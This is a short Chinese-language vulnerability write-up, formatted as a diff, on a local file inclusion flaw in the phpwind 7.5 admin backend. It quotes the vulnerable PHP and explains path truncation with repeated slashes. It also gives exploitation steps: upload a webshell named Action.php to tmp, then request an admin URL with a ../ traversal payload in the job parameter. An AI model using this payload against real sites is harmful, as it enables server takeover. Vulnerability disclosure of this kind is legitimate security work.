@@ -1,0 +1,43 @@
+Phpwind7.5后台鸡肋漏洞 
+
+二、phpwind后台本地包含漏洞：
+
+漏洞详情：
+
+文件：hack\rate\admin.php
+源码：
+
+<?php
+!function_exists(''readover'') && exit(''Forbidden'');
+define ( "H_R", R_P . "hack/rate/" );
+define ( "L_R", R_P . "lib/" );
+InitGP ( array (''ajax'' ) );
+$action = strtolower ( ($job) ? $job : "admin" );
+$filepath = H_R . "action/" . $action . "Action.php";
+
+(! file_exists ( $filepath )) && exit ();
+
+if ($job != "ajax") {
+    require H_R . ''/template/layout.php'';
+} else {
+    require_once $filepath;
+}
+
+?> 
+再看看hack\rate\template\layout.php：
+
+<?php
+!function_exists(''readover'') && exit(''Forbidden'');
+include_once PrintEot ( ''left'' );
+print <<<EOT
+-->
+EOT;
+require_once $filepath;
+include_once PrintEot ( ''adminbottom'' );
+?> 
+$job可以自定义，触发本地包含，只不过addslashes了，因此不能通过%00截断；但可以通过若干///////截断，或者直接在tmp文件夹下写个shell来包含。具体不多说了，利用办法：
+
+漏洞测试：
+
+先在tmp下上传一个shell，名为Action.php
+然后访问：http://127.0.0.1/pw/admin.php?adminjob=hack&hackset=rate&typeid=100&job=../../../../../../tmp/
